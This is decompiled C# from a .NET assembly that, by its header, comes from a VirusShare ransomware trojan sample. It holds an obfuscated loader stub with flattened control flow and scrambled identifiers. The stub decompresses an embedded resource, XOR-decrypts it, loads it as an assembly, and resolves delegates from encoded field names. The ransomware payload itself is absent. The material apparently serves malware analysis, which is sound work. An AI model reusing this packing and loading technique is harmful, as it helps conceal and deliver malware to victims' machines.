// Decompiled with JetBrains decompiler
// Type: <Module>
// Assembly: mtrl, Version=5.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 79CC5886-3FF3-4BA2-A3E6-9E50089A921D
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00090-msil\HEUR-Trojan-Ransom.Win32.Generic-5a26181f2f36991d9055db38b70c0df2d166b99d1714fb7a14978e2e0420b71d.exe

using System;
using System.Collections.Generic;
using System.IO;
using System.IO.Compression;
using System.Reflection;
using System.Reflection.Emit;
using System.Text;

internal class \u003CModule\u003E
{
  static Dictionary<uint, object> 삗潭늙ꛀ\u0E67\uFFFD\u2F42醦;
  static Stream 밬뻫曆\uF5B7轠\uF2F8閼೮;
  static Assembly 긂ǁ\u2F27鬇\u2BE3䟷췊鵶;

  static \u003CModule\u003E()
  {
    AppDomain.CurrentDomain.ResourceResolve += new ResolveEventHandler(\u003CModule\u003E.\uFFFD\uFFFD\u003A\uFFFDX\uFFFDsN\uFFFD\uFFFD\uFFFD\uFFFDk\u007E\uFFFD\u0014);
    \u003CModule\u003E.삗潭늙ꛀ\u0E67\uFFFD\u2F42醦 = new Dictionary<uint, object>();
    \u003CModule\u003E.밬뻫曆\uF5B7轠\uF2F8閼೮ = (Stream) new MemoryStream();
    int num = 10 - --6;
    DeflateStream deflateStream;
    byte[] buffer;
    int count;
    while (true)
    {
      switch (num)
      {
        case 1:
          \uEB82咟㾏简㥍륤ꑏ\uFF1D.ԅ녫쨘ᄅૃ\uF5E2蜎脞();
          num = ~(-11 - ~6);
          continue;
        case 2:
          \u003CModule\u003E.밬뻫曆\uF5B7轠\uF2F8閼೮.Write(buffer, 0, count);
          num = ~(15 - -~6) + 9;
          continue;
        case 3:
          goto label_5;
        case 4:
          deflateStream = new DeflateStream(Assembly.GetExecutingAssembly().GetManifestResourceStream(Encoding.UTF8.GetString(BitConverter.GetBytes(1804802818))), CompressionMode.Decompress);
          buffer = new byte[4096];
          num = ~(-4 - ~-9 - -5);
          continue;
        case 5:
          if (count == 0)
          {
            deflateStream.Dispose();
            num = ~(3 - (-2 + (8 - 6))) + 5;
            continue;
          }
          goto case 2;
        case 6:
          count = deflateStream.Read(buffer, 0, 4096);
          num = -(~2 - (4 - 5));
          continue;
        default:
          count = deflateStream.Read(buffer, 0, 4096);
          num = 5 + -(3 - 8) + 2 - 7;
          continue;
      }
    }
label_5:
    㨥䀩훩鑁鸉\uE6EFᬉ꺶.禒㙎鶒긹굎墱ឿ龕();
  }

  internal static void 툤坦䈃휔肉髭蜦놟(RuntimeFieldHandle f)
  {
    FieldInfo fieldFromHandle = FieldInfo.GetFieldFromHandle(f);
    int num1 = 7 - (~8 - (2 - 4)) + 6 - 2;
    DynamicMethod dynamicMethod;
    while (true)
    {
      int index1;
      ParameterInfo[] parameters;
      ConstructorInfo con;
      int num2;
      do
      {
        switch (num1)
        {
          case 1:
            if (index1 >= parameters.Length)
            {
              num2 = con.DeclaringType.IsInterface ? 1 : 0;
              num1 = --22 - (5 + 2);
              continue;
            }
            goto label_25;
          case 2:
            goto label_6;
          case 3:
          case 13:
            goto label_8;
          case 4:
            goto label_10;
          case 5:
            goto label_11;
          case 6:
            goto label_12;
          case 7:
            goto label_13;
          case 8:
            goto label_14;
          case 9:
            goto label_15;
          case 10:
            goto label_17;
          case 11:
            goto label_18;
          case 12:
            goto label_19;
          case 14:
            goto label_21;
          case 15:
            goto label_22;
          case 16:
            goto label_24;
          case 17:
            goto label_25;
          case 18:
            goto label_26;
          case 19:
            goto label_27;
          default:
            num1 = -(--3 + ~4);
            continue;
        }
      }
      while (num2 != 0);
      num1 = 4 - (-8 - -(7 - 8) - -4);
      continue;
label_6:
      int index2;
      char[] chArray;
      byte[] numArray;
      if (index2 >= chArray.Length)
      {
        numArray = Convert.FromBase64String(new string(chArray));
        num1 = --(7 - (-8 - ~9));
        continue;
      }
      goto label_13;
label_8:
      int num3;
      Type[] parameterTypes;
      if (num3 >= parameterTypes.Length)
      {
        num1 = ~(~8 - (-10 - -(5 + 7)));
        continue;
      }
      ILGenerator ilGenerator;
      ilGenerator.Emit(OpCodes.Ldarg_S, num3);
      ++num3;
      num1 = -6 + (9 - 3) + 3;
      continue;
label_10:
      num3 = 0;
      num1 = 0 + ~~6 - -7;
      continue;
label_11:
      con = fieldFromHandle.Module.ResolveMethod(BitConverter.ToInt32(numArray, 0) ^ 512259545 | (int) numArray[4] << 24) as ConstructorInfo;
      num1 = ~-22 + 2 - 4;
      continue;
label_12:
      ilGenerator = dynamicMethod.GetILGenerator();
      num1 = 17 + (-9 + 3) - -2 - 9;
      continue;
label_13:
      chArray[index2] = (char) ((uint) (byte) fieldFromHandle.Name[index2] ^ (uint) index2);
      ++index2;
      num1 = -2 + (6 + 5) - 7;
      continue;
label_14:
      num1 = -9 - -~-8 + 3;
      continue;
label_15:
      if (con.DeclaringType.IsArray)
      {
        num1 = ~-12 + 4;
        continue;
      }
      dynamicMethod = new DynamicMethod("", con.DeclaringType, parameterTypes, con.DeclaringType, true);
      num1 = --(-13 - (~5 - (7 + 6)));
      continue;
label_17:
      ilGenerator.Emit(OpCodes.Newobj, con);
      num1 = -(-(4 - 5) - 14 - (5 - 7));
      continue;
label_18:
      ilGenerator.Emit(OpCodes.Ret);
      num1 = -3 - (-30 - (6 - 4 + -9)) - 6;
      continue;
label_19:
      index2 = 0;
      num1 = 9 - --9;
      continue;
label_22:
      dynamicMethod = new DynamicMethod("", con.DeclaringType, parameterTypes, fieldFromHandle.DeclaringType, true);
      goto label_12;
label_24:
      ++index1;
      num1 = -5 - (5 + 2 - (4 + 6)) - (8 - 9) + 2;
      continue;
label_25:
      parameterTypes[index1] = parameters[index1].ParameterType;
      num1 = ~(-6 - (7 - -4));
      continue;
label_26:
      chArray = new char[fieldFromHandle.Name.Length];
      num1 = ~(~3 - ~-10);
      continue;
label_27:
      parameters = con.GetParameters();
      parameterTypes = new Type[parameters.Length];
      index1 = 0;
      num1 = ~~(-3 - (-8 + ~2));
    }
label_21:
    fieldFromHandle.SetValue((object) null, (object) dynamicMethod.CreateDelegate(fieldFromHandle.FieldType));
  }

  internal static void 彾螱ﾪ쩉\uE449髴\u2858鷹(RuntimeFieldHandle f)
  {
    FieldInfo fieldFromHandle = FieldInfo.GetFieldFromHandle(f);
    char[] chArray = new char[fieldFromHandle.Name.Length];
    int index1 = 0;
label_8:
    int num1;
    if (index1 < chArray.Length)
    {
      chArray[index1] = (char) ((uint) (byte) fieldFromHandle.Name[index1] ^ (uint) index1);
      num1 = -(-3 - ~0);
    }
    else
      goto label_9;
label_2:
    while (true)
    {
      MethodInfo methodInfo;
      Type[] parameterTypes;
      DynamicMethod dynamicMethod;
      ILGenerator ilGenerator;
      byte[] numArray;
      int index2;
      int num2;
      int length;
      do
      {
        ParameterInfo[] parameters;
        int num3;
        switch (num1)
        {
          case 1:
            ilGenerator = dynamicMethod.GetILGenerator();
            num3 = 0;
            goto case 4;
          case 2:
            ++index1;
            goto label_8;
          case 3:
            return;
          case 4:
            if (num3 < parameterTypes.Length)
            {
              ilGenerator.Emit(OpCodes.Ldarg, num3);
              if (num3 == 0)
              {
                num1 = -(~9 - -4);
                continue;
              }
              break;
            }
            num1 = 8 + 4 - (4 - ~7 - 16) - 5;
            continue;
          case 5:
            dynamicMethod = new DynamicMethod("", methodInfo.ReturnType, parameterTypes, methodInfo.DeclaringType, true);
            num1 = -(1 - (3 + 6 - (2 + 3)) - (4 - 6));
            continue;
          case 6:
            ilGenerator.Emit(OpCodes.Castclass, methodInfo.DeclaringType);
            break;
          case 7:
            num1 = -(3 - ~-5 + (8 - 8));
            continue;
          case 8:
            numArray = Convert.FromBase64String(new string(chArray));
            num1 = 4 - (-6 - (4 - 4));
            continue;
          case 9:
            parameterTypes[index2 + 1] = parameters[index2].ParameterType;
            ++index2;
            goto case 15;
          case 10:
            methodInfo = fieldFromHandle.Module.ResolveMethod(BitConverter.ToInt32(numArray, 1) ^ 1701943510 | ((int) numArray[0] & (int) sbyte.MaxValue) << 24) as MethodInfo;
            if (!methodInfo.IsStatic)
              goto default;
            else
              goto label_22;
          case 11:
            goto label_23;
          case 12:
            goto label_24;
          case 13:
            goto label_10;
          case 14:
            goto label_25;
          case 15:
            num2 = index2;
            length = parameters.Length;
            num1 = --8 + (4 + 5) - 8;
            continue;
          case 16:
            if (methodInfo.DeclaringType.IsInterface || methodInfo.DeclaringType.IsArray)
              goto label_28;
            else
              goto case 5;
          case 17:
            goto label_29;
          default:
            parameters = methodInfo.GetParameters();
            parameterTypes = new Type[parameters.Length + 1];
            num1 = -(-35 - (~7 + ~8)) - 4;
            continue;
        }
        ++num3;
        num1 = ~(-9 - -4);
      }
      while (num2 < length);
      num1 = 4 + (4 - 7) - -23 - (3 + 5);
      continue;
label_22:
      fieldFromHandle.SetValue((object) null, (object) Delegate.CreateDelegate(fieldFromHandle.FieldType, methodInfo));
      num1 = 5 - ~(3 + (4 + 9 - 9));
      continue;
label_23:
      ilGenerator.Emit(((int) numArray[0] & 128) != 0 ? OpCodes.Callvirt : OpCodes.Call, methodInfo);
      num1 = ~~(6 - (~2 + -3));
      continue;
label_24:
      ilGenerator.Emit(OpCodes.Ret);
      num1 = 8 - 2 - (~-8 - 25) - 7;
      continue;
label_25:
      parameterTypes[0] = typeof (object);
      index2 = 0;
      num1 = 9 + 4 - ~-6 + 7;
      continue;
label_28:
      dynamicMethod = new DynamicMethod("", methodInfo.ReturnType, parameterTypes, fieldFromHandle.DeclaringType, true);
      num1 = ~-~-9;
      continue;
label_29:
      fieldFromHandle.SetValue((object) null, (object) dynamicMethod.CreateDelegate(fieldFromHandle.FieldType));
      num1 = -(-4 - --7) - 8;
    }
label_10:
    return;
label_9:
    num1 = 15 - (7 + 2 + ~4) - 3;
    goto label_2;
  }

  internal static Assembly \uFFFD\uFFFD\u003A\uFFFDX\uFFFDsN\uFFFD\uFFFD\uFFFD\uFFFDk\u007E\uFFFD\u0014(
    object sender,
    ResolveEventArgs args)
  {
    if ((object) \u003CModule\u003E.긂ǁ\u2F27鬇\u2BE3䟷췊鵶 == null)
    {
      switch (-(-5 - (7 + -5)))
      {
        default:
          using (BinaryReader binaryReader = new BinaryReader((Stream) new DeflateStream(typeof (\u003CModule\u003E).Assembly.GetManifestResourceStream("�\t\t ���H����v[+A"), CompressionMode.Decompress)))
          {
            byte[] numArray = binaryReader.ReadBytes(binaryReader.ReadInt32());
            int num1 = -12 + (8 + 9);
            while (true)
            {
              byte num2;
              int num3;
              int length;
              do
              {
                int index;
                switch (num1)
                {
                  case 1:
                    index = 0;
                    break;
                  case 2:
                    \u003CModule\u003E.긂ǁ\u2F27鬇\u2BE3䟷췊鵶 = Assembly.Load(numArray);
                    Buffer.BlockCopy((Array) new byte[numArray.Length], 0, (Array) numArray, 0, numArray.Length);
                    num1 = 8 - -(-(9 + 3) - -8);
                    continue;
                  case 3:
                    num2 = (byte) ((int) num2 * 101 % 256);
                    ++index;
                    break;
                  case 4:
                    goto label_15;
                  case 5:
                    goto label_11;
                  default:
                    numArray[index] = (byte) ((uint) numArray[index] ^ (uint) num2);
                    num1 = ~(~3 - (2 - 2));
                    continue;
                }
                num3 = index;
                length = numArray.Length;
                num1 = -~-1;
              }
              while (num3 < length);
              num1 = -(3 + 7 - (3 + 5) - 12 - ~7);
              continue;
label_11:
              num2 = (byte) 101;
              num1 = ~-10 - 8;
            }
          }
      }
    }
label_15:
    if (Array.IndexOf<string>(\u003CModule\u003E.긂ǁ\u2F27鬇\u2BE3䟷췊鵶.GetManifestResourceNames(), args.Name) != -1)
      return \u003CModule\u003E.긂ǁ\u2F27鬇\u2BE3䟷췊鵶;
    switch (4 + (2 + 3 - (7 - 4)) - (8 - 5))
    {
      default:
        return (Assembly) null;
    }
  }
}
